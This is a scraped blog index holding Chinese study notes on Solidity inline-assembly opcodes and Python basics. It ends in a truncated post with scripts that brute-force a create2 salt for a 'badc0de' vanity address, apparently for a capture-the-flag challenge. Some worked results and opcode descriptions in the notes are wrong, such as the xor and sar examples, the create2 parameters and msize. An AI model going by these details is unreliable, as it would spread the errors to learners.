and(n1, n2) mstore(0x00, result) return(0x00, 0x20) &#125;&#125;// 1010// 1011// 1011 = 11function or(uint n1, uint n2) external pure returns(uint) &#123; assembly &#123; let result := or(n1, n2) mstore(0x00, result) return(0x00, 0x20) &#125;&#125;// 1010// 1011// 1011 = 1function xor(uint n1, uint n2) external pure returns(uint) &#123; assembly &#123; let result := xor(n1, n2) mstore(0x00, result) return(0x00, 0x20) &#125;&#125;// 逻辑左移 将 n2 左移 n1 位// 0001// &lt;&lt; 2// 0100 = 4function shl(uint n1, uint n2) external pure returns(uint) &#123; assembly &#123; let result := shl(n1, n2) mstore(0x00, result) return(0x00, 0x20) &#125;&#125;// 逻辑右移 将 n2 右移 n1 位// 0100// &gt;&gt; 2// 0001 = 1function shr(uint n1, uint n2) external pure returns(uint) &#123; assembly &#123; let result := shr(n1, n2) mstore(0x00, result) return(0x00, 0x20) &#125;&#125;// 算术右移 将 n2 算术右移 n1 位// 1011 = 11// &gt;&gt; 2// 0010 = 14function sar(uint n1, uint n2) external pure returns(uint) &#123; assembly &#123; let result := sar(n1, n2) mstore(0x00, result) return(0x00, 0x20) &#125;&#125; 运行结果： 其中，shr和sar的结果是相同的，我认为这和solidtiy中无符号整数有关 2.1.5 比较运算符：lt,gt,eq,iszero语法： 1234lt(x, y) // 如果 x &lt; y 为 1，否则为 0gt(x, y) // 如果 x &gt; y 为 1，否则为 0eq(x, y) // 如果 x == y 为 1，否则为 0iszero(x) // 如果 x == 0 为 1，否则为 0 示例： 1234567891011121314151617181920212223242526272829303132function lt(uint n1, uint n2) external pure returns(uint) &#123; assembly &#123; let result := lt(n1, n2) mstore(0x00, result) return(0x00, 0x20) &#125;&#125;function gt(uint n1, uint n2) external pure returns(uint) &#123; assembly &#123; let result := gt(n1, n2) mstore(0x00, result) return(0x00, 0x20) &#125;&#125; function eq(uint n1, uint n2) external pure returns(uint) &#123; assembly &#123; let result := eq(n1, n2) mstore(0x00, result) return(0x00, 0x20) &#125;&#125; function iszero(uint n1) external pure returns(uint) &#123; assembly &#123; let result := iszero(n1) mstore(0x00, result) return(0x00, 0x20) &#125;&#125; 运行结果： 心得：我觉得这个操作码简单理解起来就是：操作是一回事，存是一回事，取又是另一回事。先操作，再存，最后取，例如： 123let sum := add(x,y)mstore(0x00, sum)return(0x00, 0x20) *** 这就是典型的先执行 add操作，再将算出来的 sum 结果保存到 EVM中，最后再从EVM中取出来*** 2.2 进阶操作码的演示2.2.1 addmod,mulmod的用法语法： 12addmod(x, y, m) //任意精度的 (x + y) % mmulmod(x, y, m) //任意精度的 (x * y) % m “addmod” 操作符的语法为：addmod(x, y, m)。它将两个参数 x 和 y 相加，然后将结果对参数 m 取模，最后返回结果。”mulmod”同理。 示例： 1234567891011121314151617function _addmod(uint256 x, uint256 y, uint256 m) public pure returns (uint256) &#123; uint256 result; assembly &#123; result := addmod(x, y, m) &#125; return result;&#125;function _mulmod(uint256 x, uint256 y, uint256 m) public pure returns (uint256) &#123; uint256 result; assembly &#123; result := mulmod(x, y, m) &#125; return result;&#125; 运行结果： 2.2.2 keccak256的用法关于string类型的存储方式 语法： 1keccak256(p, n) //keccak(mem[p...(p + n))) 示例： 12345678910111213141516171819function _keccak256(string memory message) public pure returns (bytes32) &#123; bytes32 result; assembly &#123; result := keccak256(add(message, 32), mload(message)) &#125; return result; &#125;function _keccak256_1(string memory message) public pure returns (bytes32) &#123; bytes32 result = keccak256(abi.encodePacked(message)); return result; &#125;function _keccak256_2(string memory message) public pure returns (bytes32) &#123; bytes32 result = keccak256(abi.encode(message)); return result; &#125; 运行结果： 从结果中可以看到，汇编中的keccak256使用的打包方式是紧打包即abi.encodePacked() 拓展： 解读： assembly &#123;result := keccak256(add(message, 32), mload(message))&#125; 首先知道，string类型的变量在 EVM中的存储方式类似于动态数组，在智能合约的书写位置即插槽slot存储的是，string变量值存储的位置，而在存储具体位置上，string变量前32位存储的是string值的长度，32位之后才是具体的 string变量的值。 我们可以通过代码验证一下： 1234function _stringToBytes(string memory message) public pure returns (bytes memory) &#123; bytes memory result = (abi.encode(message)); return result;&#125; 运行结果： 由运行结果的三个部分我们看出： 2: 是参数biyou 在内存中的存储位置（应该是slot2）； 5: 是参数biyou的长度； 6269796f75:参数的内容： &quot;biyou&quot; 的 UTF-8 编码（在这里等同于 ASCII 编码），并在右侧（低位）用 0 值字节补充到 32 字节。 其次，(add(message, 32)，是为了找到 message在内存中的地址，可以理解为，经过 (add(message, 32)这一步骤之后，message的指针已经指向了包括 message的长度以及具体数据这个整体的第一个索引（经过实际验证之后这是错误的）由如下代码以及结果可知，(add(message, 32)指向的是跳过了字符串长度，字符串具体值的第一个索引。 代码： 1234567function add(string memory message) public pure returns (bytes32) &#123; bytes32 result; assembly &#123; result := add(message, 32) return(result,32) &#125; &#125; 运行结果： 说明：如果直接填入message好像会自动找到message值的具体存储位置 然后，mload(message)，则是找到message的长度，通过代码验证 代码： 1234567function mload(string memory message) public pure returns (bytes32) &#123; bytes32 result; assembly &#123; result := mload(message) &#125; return result;&#125; 运行结果： 总结：add(message, 32)先将指针指向message具体的值, mload(message)获取message的长度，keccak256(add(message, 32), mload(message))则是对message具体的值进行hash，即keccak256(0x6269796f75000000000000000000000000000000000000000000000000000000),其结果和keccak256(abi.encodePacked(message))结果相同。 2.2.3 mload的用法语法： 1mload(p) //mem[p...(p + 32)) 读取指定位置p后的 32位内存地址中的值 示例： 1234567891011function mload(uint index) public pure returns(uint) &#123; uint result; assembly &#123; let n1 := 666 let n2 := 999 mstore(0x00,n1) mstore(0x20,n2) result := mload(index) &#125; return result;&#125; 运行结果： 2.2.4 number的用法语法： 1number() // 当前区块 示例： 1234567function getCurrentInstructionNumber() public view returns (uint) &#123; assembly &#123; let instructionNumber := number() mstore(0x00,instructionNumber) return(0x00,32) &#125;&#125; 运行结果： 2.2.5 sload 和 sstore的用法语法： 12sload(p) // storage[p]sstore(p, v) // storage[p] := v ① 其中，p是一个uint类型的值，表示要读取字的存储器地址。sload指令的作用是从以p为地址的存储器位置中读取一个字，并将其作为uint类型的值返回。类似于使用web3 或 etherjs的 gerAtStorage(p)的操作 ② 其中，p是一个uint类型的值，表示要存储字的存储器地址，v是一个uint类型的值，表示要存储的字的值。sstore指令的作用是将v存储到以p为地址的存储器位置中。具体来说，sstore指令将字节序列v的前32个字节存储到以p为地址的存储器位置中。 示例： 123456789101112131415161718192021222324252627282930// SPDX-License-Identifier: GPL-3.0pragma solidity &gt;= 0.8.0;contract assembly_day1 &#123; address owner; constructor() &#123; owner = msg.sender; &#125; // 查询当前合约的拥有者 function getOwner() external view returns(address) &#123; return owner; &#125; function sload(uint position) public view returns (uint) &#123; uint value; assembly &#123; value := sload(position) &#125; return value; &#125; function sstore(uint position,uint _addr) public returns (uint) &#123; assembly &#123; sstore(position, _addr) let result := sload(position) return(mul(position, 32), 32) &#125; &#125;&#125; 运行结果： 调用sstore之前： 调用sstore之后： 2.2.6 msize的用法语法： 1msize() //内存大小，即最大可访问内存索引 msize指令的作用是返回当前合约的存储器大小，以字节为单位。存储器大小是当前合约的存储器使用量，用于存储合约的状态变量和其他数据。 示例： 1234567function msize() public view returns (uint) &#123; uint size; assembly &#123; size := msize() &#125; return size;&#125; 运行结果： 2.2.7 gas的用法语法： 1gas() // 执行可用的 gas gas标识符返回一个uint类型的值，表示当前合约中可用的燃料数量。燃料是一种代币，用于支付交易费用和合约执行费用。在Solidity中，可以使用gas标识符获取当前合约中还剩余的燃料数量，以便在执行合约代码时进行相应的控制。 示例： 1234567function gas() public view returns (uint) &#123; uint remaining; assembly &#123; remaining := gas() &#125; return remaining;&#125; 运行结果： 2.2.8 address的用法语法： 1address() //当前合约 / 执行上下文的地址 address标识符可以与其他指令结合使用，用于获取合约地址或其他地址的信息。 示例： 123456789101112131415function getContractAddress() public view returns (address) &#123; address addr; assembly &#123; addr := address() &#125; return addr;&#125;function getCallerAddress() public view returns (address) &#123; address addr; assembly &#123; addr := caller() &#125; return addr;&#125; 运行结果： 2.2.9 balance的用法语法： 1balance(a) // 地址 a 的余额，以 wei 为单位 其中，a是一个地址类型的值，表示要查询余额的地址。balance标识符的作用是返回指定地址的余额，以wei为单位。 示例： 1234567function getBalance(address account) public view returns (uint) &#123; uint _balance; assembly &#123; _balance := balance(account) &#125; return _balance;&#125; 运行结果： 2.2.10 caller的用法语法： 1caller() // 调用发起者 caller标识符返回一个address类型的值，表示当前函数的调用者地址。调用者是指调用当前函数的合约或外部账户。 示例： 1234567function getCaller() public view returns (address) &#123; address callerAddr; assembly &#123; callerAddr := caller() &#125; return callerAddr;&#125; 运行结果： 2.2.11 extcodesize的用法语法： 1extcodesize(address) //地址 address 的代码大小 其中，address表示要获取代码长度的合约地址。 示例： 1234567function extcodesize(address _test) external view returns(uint) &#123; assembly &#123; let size := extcodesize(_test) mstore(0x00, size) return(0x00, 0x20) &#125;&#125; 运行结果： 2.2.12 create的用法语法： 1create(v, p, s) // 用 mem[p...(p + s)) 中的代码创建一个新合约、发送 v wei 并返回 新地址 其中，v表示要向新合约发送的以太币数量，p表示要复制到新合约地址内存中的代码的偏移量，s表示要复制到新合约地址内存中的代码的长度。 示例： 123456789101112131415161718192021222324252627// SPDX-License-Identifier: GPL-3.0pragma solidity &gt;= 0.8.0;contract test &#123; string public name; constructor() &#123; name = &quot;biyou&quot;; &#125;&#125;contract assembly_day2 &#123; function createNewContract(uint value, bytes memory code) public returns (address) &#123; address newContract; assembly &#123; newContract := create( value, // 表示要向新合约发送的以太币数量 add(code, 0x20), // 表示跳过数组长度 mload(code)) // 读取code的长度 &#125; return newContract; &#125;&#125; 运行结果： 2.2.13 create2的用法语法： 1create2(v, n, p, s) // 用 mem[p...(p + s)) 中的代码，在地址 keccak256(&lt;address&gt; . n . keccak256(mem[p...(p + s))) 上 创建新合约、发送 v wei 并返回新地址 其中，v表示要向新合约发送的以太币数量，n表示要复制到新合约地址内存中的代码的偏移量，p表示要复制到新合约地址内存中的代码的长度，s是一个任意的32字节值，用于生成新合约地址。 示例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// SPDX-License-Identifier: GPL-3.0pragma solidity &gt;= 0.8.0;contract test &#123; string public name; constructor() &#123; name = &quot;biyou&quot;; &#125;&#125;contract assembly_day2 &#123; // /* 使用代码中 create2() */ function create2NewContractByCode(string memory salt) public view returns (address) &#123; bytes memory code = type(test).creationCode; address result = address(uint160(uint( keccak256( abi.encodePacked( uint8(0xff), address(this), keccak256(abi.encodePacked(salt)), keccak256(code) ) ) ))); return result; &#125; // /* 使用内联汇编自带的 create2() */ function create2NewContractByInline(string memory salt) public returns (address) &#123; bytes memory code = type(test).creationCode; bytes32 _salt = keccak256(abi.encodePacked(salt)); address result; assembly &#123; result := create2( 0, // value 表示要向新合约发送的以太币数量 add(code, 32), // 表示跳过数组长度 mload(code), // 读取code的长度 _salt // 盐 ) &#125; return result; &#125;&#125; 运行结果： 由结果可以看出，采用两种方法创建出的新合约地址是相同的； 需要注意的是，两种方法中各参数所处的位置是很不相同的。 2.2.14 selfdestruct的用法语法： 1selfdestruct(_addr) // _addr表示合约注销之后钱转移的地址 address表示要将剩余的以太币发送到的目标地址。 示例： 12345function _selfdestruct(address _addr) external payable &#123; assembly &#123; selfdestruct(_addr) &#125;&#125; 运行结果： 未执行前： contract test的余额： 执行之后： contract test的余额： 2.2.15 origin的用法语法： 1origin() origin指令用于获取当前交易的发送者地址。与msg.sender不同的是，origin指令返回的是交易的最初发送者地址，即交易链的起点。 示例： 1234567891011121314151617181920212223242526272829303132// SPDX-License-Identifier: GPL-3.0pragma solidity &gt;= 0.8.0;contract test &#123; string public name; constructor() &#123; name = &quot;biyou&quot;; &#125; function testOrigin(address _addr) public view returns(address) &#123; address result = assembly_day2(_addr).origin(); return result; &#125;&#125;contract assembly_day2 &#123; constructor() payable &#123; &#125; function origin() public view returns (address) &#123; address _origin; assembly &#123; _origin := origin() &#125; return _origin; &#125;&#125; 运行结果： 2.2.16 blockhash的用法语法： 1blockhash(blockNumber) //区块号 blockNumber 的哈希 - 目前仅适用于不包括当前区块的最后 256 个区块 blockNumber表示要获取哈希值的块号。请注意，由于Ethereum区块链的设计，只能获取最近的256个块的哈希值。因此，blockNumber的值必须在当前块与最近的256个块之间。 示例： 123456789101112// 如下写法hash的值是 0x0000000000000000000000000000000000000000000000000000000000000000// 因为 当前区块还没有出生，语法写的很清楚了，是我没有理解到位function getBlockHash() public view returns (uint, bytes32) &#123; bytes32 hash; uint num; assembly &#123; num := number() hash := blockhash(num) // number() 获取当前区块号 &#125; return (num, hash); &#125; 运行结果： 2.2.17 timestamp的用法语法： 1timestamp() timestamp指令用于获取当前块的时间戳。时间戳表示当前块生成的时间，以秒为单位。 示例： 12345678function getCurrentTimestamp() public view returns (uint) &#123; uint _timestamp; assembly &#123; _timestamp := timestamp() &#125; return _timestamp;&#125; 运行结果： 2.2.18 call的用法（暂时还没理解到位。。。。） 语法： 1234567```*示例：*```solidity 运行结果：","categories":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"},{"name":"Basic_Knowledge","slug":"Solidity/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Solidity/Basic-Knowledge/"},{"name":"Utils","slug":"Solidity/Utils","permalink":"https://biyouqiuqiu.com/categories/Solidity/Utils/"}],"tags":[{"name":"内联汇编","slug":"内联汇编","permalink":"https://biyouqiuqiu.com/tags/%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96/"}]},{"title":"python网课笔记","slug":"Python/Basic_Knowledge/python网课笔记","date":"2023-06-02T16:18:01.000Z","updated":"2023-06-02T16:18:01.000Z","comments":true,"path":"2023/06/03/Python/Basic_Knowledge/python网课笔记/","link":"","permalink":"https://biyouqiuqiu.com/2023/06/03/Python/Basic_Knowledge/python%E7%BD%91%E8%AF%BE%E7%AC%94%E8%AE%B0/","excerpt":"","text":"B站python视频链接day01 (P1——P58)1. open()函数在 Python 中，open() 函数可以用来打开文件并操作文件。 open() 函数的语法如下： 1open(file, mode=&#x27;r&#x27;, buffering=-1, encoding=None, errors=None, newline=None, closefd=True, opener=None) 其中，参数： file：要打开的文件名（包括文件路径）。 mode：打开文件的模式，默认为只读模式 &#39;r&#39;，还可选写入模式 &#39;w&#39;，追加模式 &#39;a&#39;，二进制模式 &#39;b&#39; 和读写模式 &#39;+&#39; 等。 buffering：缓冲策略，0 表示不缓冲，1 表示缓冲一行，大于 1 表示缓冲区大小（单位为字节）。 encoding：指定文件编码方式，默认为 None，即使用系统默认的编码方式。 errors：指定编解码错误处理方案，默认为 &#39;strict&#39;，即遇到错误会抛出异常。 newline：指定写入文件时使用的换行符，可选值有 None、&#39;&#39;、&#39;\\n&#39;、&#39;\\r&#39; 和 &#39;\\r\\n&#39;。 closefd：当使用文件描述符时，如果值为 False，则不关闭底层文件描述符。 opener：一个可选的自定义打开器，用于通过自定义方式打开文件。 执行如下代码，将在E:/下生成一个temp.txt文件 12345# open() 函数# a+表示文件夹不存在就新建，存在的话就追加内容fp = open(&quot;E:/temp.txt&quot;,&quot;a+&quot;,encoding=&quot;UTF-8&quot;)print(&quot;第一次使用open函数&quot;,file=fp)fp.close 2. 原字符 — 使转义字符不生效不希望字符串中的转义字符起作用，就使用原字符 — 使用方法：在字符串前加上r或R 3. 数据类型3.1 整数类型有关进制的pyhton中的表现 3. 2 浮点类型 3.3 浮点类型 3.4 字符串类型 4. 数据类型转换 4.1 int类型转str类型 解决办法： 1print(&#x27;我叫&#x27;+name+&#x27;,今年&#x27;+str(age)+&#x27;岁&#x27;) #将int类型的age转成字符串类型 4.2 其他类型转成str类型 4.3 int()将其他类型转为int类型注：int()不能转小数串或者文字串 4.4 float() 将其他类型转为float类型注：float()不能转文字串 5.python中的注释 6. inputh()函数注：input()函数输入的结果是字符串类型 7.运算符 7.1 基本算术运算语言的运算符的使用方式大差不差，python中要注意的是： 123print(1/2)#结果是0.5，区别于java(具体看如何定义的吧，如果1定义为int类型，则结果是0)print(11//2) #结果是5，`//`表示整除print(2**3) #结果是8，表示2的3次方 7.2 复杂算数运算（涉及正负数运算）整除 //:需要向下取整 求余%: 公式 &#x3D;&gt; 余数=被除数-除数*商 7.3 赋值运算符注：运算顺序从右到左 7.4 比较运算符 注：比较运算符的结果是bool类型 7.5 布尔运算 7.6 位运算符 7.7 运算符的优先级 8.id()的使用 在Python中，对于一些简单的对象类型（如整数、浮点数、布尔值等），如果它们的值相同，那么它们的id也相同。这是因为Python中对这些对象类型进行了优化，将某些常用的对象缓存起来，使得在程序中多次使用相同的值时，它们的id是相同的。 例如，对于整数对象，Python将[-5, 256]范围内的整数缓存起来，因此如果两个整数变量的值在这个范围内且相同，它们的id就相同。 示例代码： 1234a = 10b = 10print(id(a)) # 输出：140735263730704print(id(b)) # 输出：140735263730704 但对于其他对象类型（如列表、元组、字典等），如果它们的值相同，它们的id不一定相同，因为它们是不同的对象。 示例代码： 1234a = [1, 2, 3]b = [1, 2, 3]print(id(a)) # 输出：140735263499528print(id(b)) # 输出：140735263501256 9. 组织结构（流程控制）9.1 对象的布尔值 在 Python 中，以下对象的值会被判断为 False： False：布尔类型的 False 值 None：表示空对象或缺失值的唯一对象 0：整数类型的零值 0.0：浮点数类型的零值 0j：复数类型的零值 “”：空字符串 ()：空元组 []：空列表 {}：空字典 set()：空集合 9.2 多分支结构 9.3 条件表达式注：有点类似三元运算，只不过感觉换了一种写法 9.4 pass语句pass: 什么都做，只是一个占位符 写法： 12345score=input(&quot;请输入你的成绩：&quot;)if(score&gt;60): passelse: pass 9.5 内置函数range() range()的三种创建方式： list()的使用： 可以使用list()函数将range()函数生成的整数序列转化为列表，例如 12my_list = list(range(5))print(my_list) 输出结果： 1[0, 1, 2, 3, 4] in与not in：判断整数序列是否存在（不存在）指定的整数 9.6 循环结构注：需要严格遵守格式要求 9.6.1 while循环12while (): # while 结构体写在这里，结构体中的代码需要左对齐 示例：计算1到100之间的偶数和 12345678sum = 0a = 1while (a &lt;= 100) : if not bool(a % 2): # if a % 2 == 0 sum += a a += 1print(&quot;sum = &quot;,sum) 解读： a % 2的值是 0，而0的bool对象是 False，not bool(a % 2)的值就是 True 9.6.2 for - in 循环 range() 产生一个整数序列 示例： 123for i in range(10): print(i)# 结果：换行输出 [0,10)] for循环实现三位数的水仙花数 1234567for item in range(100,1000): ge = item % 10 shi = item // 10 % 10 bai = item // 100 if (ge**3 + shi**3 + bai**3): print(item) 9.6.3 流程控制语句break结束当前循环，直接退出循环 9.6.4 流程控制语句continue结束本次（当前）循环，进入下一次循环 9.6.5 else语句（和while for搭配使用） 注：for 和 else 同级，与while搭配同理 9.6.6 二重循环中的break和continue注: 二重循环中的break和continue，只用于控制本层循环，不会影响外层循环 10. 列表10.1 列表的定义 10.2 列表的内存分析 10.3 列表的创建 10.4 列表的特点注：python的索引还可以是负数的,列表中的任意数据类型可以混存 在 Python 中，负数索引表示从列表的末尾开始计数，例如，-1 表示列表中的最后一个元素，-2 表示列表中的倒数第二个元素，依此类推。 例如，考虑以下列表： 1my_list = [1, 2, 3, 4, 5] 可以使用正数索引或负数索引来访问列表中的元素，例如： 123print(my_list[0]) # 输出 1print(my_list[-1]) # 输出 5print(my_list[-2]) # 输出 4 在 Python 中，使用负数索引可以方便地访问列表中的最后几个元素，尤其在列表长度未知的情况下，负数索引可以避免计算列表长度。需要注意的是，使用负数索引时，索引的范围是从 -1 到 -n，其中 n 是列表的长度。 需要特别注意的是，对于空列表，无论是正数索引还是负数索引，都会导致 IndexError 异常。 10.5 列表的查询操作 10.6 切片用法：获取列表中的多个元素 在 Python 中，切片（slice）是用于从序列（例如列表、元组、字符串等）中获取子序列的方法。切片使用方括号和冒号来表示，语法格式为： 1my_sequence[start:stop:step] 其中，start 表示子序列的起始位置，stop 表示子序列的结束位置（不包括该位置），step 表示步长（即每隔几个元素取一个）。如果不指定 start 或 stop，表示从序列的开头或结尾开始取。如果不指定 step，默认为 1。 切片操作返回一个新的序列，与原序列共享元素对象，可以用于获取子序列、复制序列、反转序列等操作。以下是一些切片操作的示例： 12345678910111213141516my_list = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]# 获取前三个元素print(my_list[:3]) # 输出 [1, 2, 3]# 获取第二个到第五个元素print(my_list[1:5]) # 输出 [2, 3, 4, 5]# 获取第一个到最后一个元素，步长为2print(my_list[::2]) # 输出 [1, 3, 5, 7, 9]# 获取倒数第三个到倒数第一个元素print(my_list[-3:]) # 输出 [8, 9, 10]# 反转列表print(my_list[::-1]) # 输出 [10, 9, 8, 7, 6, 5, 4, 3, 2, 1] 除了列表之外，切片还可以用于元组、字符串等序列类型。需要注意的是，对于不可变序列（例如元组、字符串），切片操作返回的仍然是一个新的序列，不会修改原序列。 10.7 列表元素的增加操作 注：执行元素的append()增加操作，不会改变的原对象的内存地址，内存分析如下： extend()的特点，及和append()的区别： insert()在列表的任意位置添加一个元素 切片在列表的任意位置添加至少一个元素 10.8 列表元素的删除操作 remove()删除一个元素： pop()删除指定索引位置上的元素: 切片删除至少一个元素: del删除列表对象： 10.9 列表元素的修改操作 修改操作的内存分析： 使用切片对列表进行修改： 10.10 排序操作 sort()和sorted()sort()是在原列表的基础上进行的 通过使用 reverse=True（降序）和 reverse=False（升序）对列表中 降序 和 升序排列，默认是升序排列 sorted()对列表进行排序，将产生一个新的列表对象 同理，sorted()也可以使用 reverse=True（降序）和 reverse=False（升序）对列表中 降序 和 升序排列，默认是升序排列 10.11 列表生成式 day02 P59–P7511. 字典 Python中的字典（dictionary）是一种无序的键值对集合，可以通过键来快速访问对应的值。字典使用大括号 {} 来表示，每个键值对之间使用逗号分隔。下面是字典的使用方法： 创建字典 要创建一个字典，可以使用花括号 {} 或者 dict() 函数。例如： 12345# 使用花括号创建字典my_dict = &#123;&#x27;name&#x27;: &#x27;John&#x27;, &#x27;age&#x27;: 25, &#x27;city&#x27;: &#x27;New York&#x27;&#125;# 使用 dict() 函数创建字典my_dict = dict(name=&#x27;John&#x27;, age=25, city=&#x27;New York&#x27;) 访问字典元素 可以使用键来访问字典中的元素。例如： 1234# 访问字典中的元素print(my_dict[&#x27;name&#x27;]) # 输出：Johnprint(my_dict[&#x27;age&#x27;]) # 输出：25print(my_dict[&#x27;city&#x27;]) # 输出：New York 如果字典中不存在指定的键，则会抛出 KeyError 异常。 添加和修改元素 可以通过赋值操作来添加或修改字典中的元素。例如： 12345# 添加元素my_dict[&#x27;email&#x27;] = &#x27;john@example.com&#x27;# 修改元素my_dict[&#x27;age&#x27;] = 26 删除元素 可以使用 del 关键字来删除字典中的元素。例如： 12# 删除元素del my_dict[&#x27;city&#x27;] 遍历字典 可以使用 for 循环来遍历字典中的元素。例如： 123# 遍历字典中的元素for key, value in my_dict.items(): print(f&#x27;&#123;key&#125;: &#123;value&#125;&#x27;) 其他常用方法 除了上面提到的方法，字典还提供了一些其他常用的方法，例如： keys()：返回字典中所有的键。 values()：返回字典中所有的值。 get()：根据键获取对应的值，如果键不存在则返回指定的默认值。 clear()：清空字典中的所有元素。 11. 1字典的定义 11.2 字典的存储方式 11.3 字典的创建 11. 4 从字典中获取值 11.5 key的判断&amp;字典元素的删除&amp;字典元素的新增 11.6 获取字典视图的方法 11.7 字典元素的遍历 11.8 字典生成式 注：如果键的个数小于值的个数，只会按键的个数创建元组 12 .元组12.1 元组的定义 12.2 元组的创建方式 12. 3 为什么要将元组设计成不可变序列 12.4 元组的遍历 13. 集合13.1 集合的定义 13.2 集合的创建方式 13.3 集合的相关操作 13.4 集合间的关系 13.5 集合的数学操作 13.6 集合的生成式 13.7 列表、字典、元组、集合总结 day03 P76 – P14. 字符串14.1 字符串的驻留机制 12345a = &quot;abc&quot;b = &quot;ab&quot; + &quot;c&quot;c = &quot;&quot;.join([&quot;ab&quot;,&quot;c&quot;])a is b #Truea is c #False 解读：a和b是在编译时分配的内存，而c是在运行后，再开辟空间赋予内存，所以他们的内存地址不一样 14.2 字符串的常用操作14.2.1 字符串的查询操作 index()在查找没有的元素时会报错，find()不会，它会返回 -1 14.2.2 字符串的大小写转换 注：转化之后会创建出新的字符串对象，内存地址不一样 注: 这里应该是使用了字符串的驻留机制，先在字符串池找，如果有则引用，没有则new（新建） 14.2.3 字符串内容对齐操作 注: zfill()函数，右对齐，使用0进行补齐，（感觉可以在智能合约的一些计算中可以使用到） 14.2.4 字符串的分割 以split()为例 rsplit()同理，只不过是从右边开始 14.2.5 判断字符串操作 注：,逗号不是合法的标识符 14.2.6 字符串的替换和合并 14.2.7字符串的比较操作 14.2.8字符串的切片 14.3 格式化字符串 表示精度和小数 %百分号表示 &#123;&#125;表示 14.4 字符串的编码转换 15. 函数15.1 函数的创建和调用 15.2 函数的参数传递 15.3 函数参数传递的内存分析 总结：在函数调用过程中，进行参数的传递 如果是不可变对象，在函数体的修改不会影响实参的值 如果是可变对象，在函数体的修改会影响到实参的值 类似值传递和引用传递 15.4 函数的返回值 15.5 函数的参数定义 15.6 函数参数的总结 将序列中的每个元素都转换为位置参数 将字典中的键值对转换为关键字实参 15.7 变量的作用域 15.8 递归函数 16.bug16.1 bug的常见类型 16.2 异常处理机制 16.3 常见的异常类型 17.编程思想 18.类和对象 18.1 类的创建（类的定义） 18.2 对象的创建 18.3 类属性，类方法，静态方法 18.4 动态绑定属性和方法 python居然可以动态给对象加属性和方法","categories":[{"name":"Python","slug":"Python","permalink":"https://biyouqiuqiu.com/categories/Python/"},{"name":"Basic_Knowledge","slug":"Python/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Python/Basic-Knowledge/"}],"tags":[{"name":"python","slug":"python","permalink":"https://biyouqiuqiu.com/tags/python/"}]},{"title":"calAddressByCreate2","slug":"Solidity/Basic_Knowledge/calAddressByCreate2","date":"2023-05-25T15:10:10.000Z","updated":"2023-05-25T15:10:10.000Z","comments":true,"path":"2023/05/25/Solidity/Basic_Knowledge/calAddressByCreate2/","link":"","permalink":"https://biyouqiuqiu.com/2023/05/25/Solidity/Basic_Knowledge/calAddressByCreate2/","excerpt":"","text":"calAddressByCreate21. 【使用python】这里是借鉴张学长的🤣 1.1 安装web3库1pip install web3 1.2 计算代码12345678910111213141516171819202122232425262728from web3 import Web3# value of your address(this) # must delet 0x# example：0x5B38Da6a701c568545dCfcB03FcB875f56beddC4address = &quot;5B38Da6a701c568545dCfcB03FcB875f56beddC4&quot;# 固定常量 0xffconst_value = &quot;0xff&quot;# 将前两个值拼接起来s1 = const_value + address# 这个为代部署合约的字节码，可以通过keccak256(abi.encodePacked(bytecode))来计算s3 = &#x27;&#x27;i = 0while(True): salt = hex(i)[2:].rjust(64, &#x27;0&#x27;) s = s1+salt+s3 hashed = Web3.keccak(hexstr=s) hashed_str = &#x27;&#x27;.join([&#x27;%02x&#x27; % b for b in hashed]) if &#x27;badc0de&#x27; in hashed_str[24:]: print(salt,hashed_str) break i += 1 print(hashed) python暂时没学好，等过段时间再回来解读 2.【使用ethereumjs】2.1 安装ethereumjs库1npm install ethereumjs-util 2.2 计算代码bytecode的值前要填 0x 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758const eth = require(&#x27;ethereumjs-util&#x27;);// a. 常数const const_num = &quot;0xFF&quot;;// b. 创建者地址（合约地址）// 一般情况下是： address(this)// 拼接的时候不能包含 `0x`const contract_add = &quot;0xf2B1114C644cBb3fF63Bf1dD284c8Cd716e95BE9&quot;;// 3. 拼接 const str1 = const_num + contract_add.slice(2,contract_add.length);// 4. 代部署合约的字节码的hash值 const bytecode = &quot;0x608060405234801561000f575f80fd5b506103478061001d5f395ff3fe608060405234801561000f575f80fd5b5060043610610034575f3560e01c8063380c7a6714610038578063b2fa1c9e14610042575b5f80fd5b610040610060565b005b61004a61009d565b6040516100579190610219565b60405180910390f35b610069336100ad565b610071575f80fd5b61007a33610144565b610082575f80fd5b60015f806101000a81548160ff021916908315150217905550565b5f8054906101000a900460ff1681565b5f7f736d6172780000000000000000000000000000000000000000000000000000008273ffffffffffffffffffffffffffffffffffffffff166306fdde036040518163ffffffff1660e01b8152600401602060405180830381865afa158015610118573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061013c9190610269565b149050919050565b5f808260601b90505f6f0badc0de00000000000000000000000090505f6f0fffffff00000000000000000000000090505f5b60228110156101f257826bffffffffffffffffffffffff19168285166bffffffffffffffffffffffff1916036101b35760019450505050506101fa565b6004826bffffffffffffffffffffffff1916901b91506004836bffffffffffffffffffffffff1916901b925080806101ea906102ca565b915050610176565b505f93505050505b919050565b5f8115159050919050565b610213816101ff565b82525050565b5f60208201905061022c5f83018461020a565b92915050565b5f80fd5b5f819050919050565b61024881610236565b8114610252575f80fd5b50565b5f815190506102638161023f565b92915050565b5f6020828403121561027e5761027d610232565b5b5f61028b84828501610255565b91505092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f819050919050565b5f6102d4826102c1565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff820361030657610305610294565b5b60018201905091905056fea26469706673582212206e6c1e4a56c3130f88f4149292cceaff6d90339aeaa3f29562e40adef7c39b2a64736f6c63430008140033&quot;;let bytecodeToHash = eth.bufferToHex(eth.keccakFromHexString(bytecode));// 去掉0xbytecodeToHash = bytecodeToHash.slice(2, bytecodeToHash.length);let salt = 0;while (true) &#123; // 1. Convert i to hex, and it pad to 32 bytes: // 1. 将i转为16进制的字符串，padStart右对齐，用 0 补齐32bytes // var saltToBytes = salt.toString(16).padStart(64, &#x27;0&#x27;); let saltToHex = &quot;0x&quot; + salt.toString(16); let saltToHash = eth.bufferToHex(eth.keccakFromHexString(saltToHex)); saltToHash = saltToHash.slice(2, saltToHash.length); // 2. Concatenate this between the 